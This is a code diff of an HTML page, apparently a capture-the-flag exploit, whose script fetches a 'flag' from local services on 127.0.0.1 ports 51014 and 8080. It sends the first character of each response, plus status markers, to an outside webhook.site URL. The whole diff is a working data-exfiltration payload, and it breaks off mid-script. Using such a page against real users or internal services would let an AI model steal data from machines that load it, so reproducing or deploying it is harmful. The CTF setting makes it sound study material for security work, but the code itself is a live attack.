@@ -6,13 +6,28 @@
         <title>borg</title>
     </head>
     <body>
+        <p>lol 1.2</p>
         <script>
             fetch("127.0.0.1:51014/flag").then((response) => {
                 response.text().then((text) => {
                     fetch(
-                        "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + document.body.innerText[0]
+                        "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + text[0]
                     );
                 });
+                fetch(
+                    "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + "completted"
+                );
+            });
+
+            fetch("127.0.0.1:8080/flag").then((response) => {
+                response.text().then((text) => {
+                    fetch(
+                        "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + text[0]
+                    );
+                });
+                fetch(
+                    "https://webhook.site/227c86cb-edca-4cde-8f7c-1c224c6f1eb4?lol=" + "do2"
+                );
             });
             
             fetch(
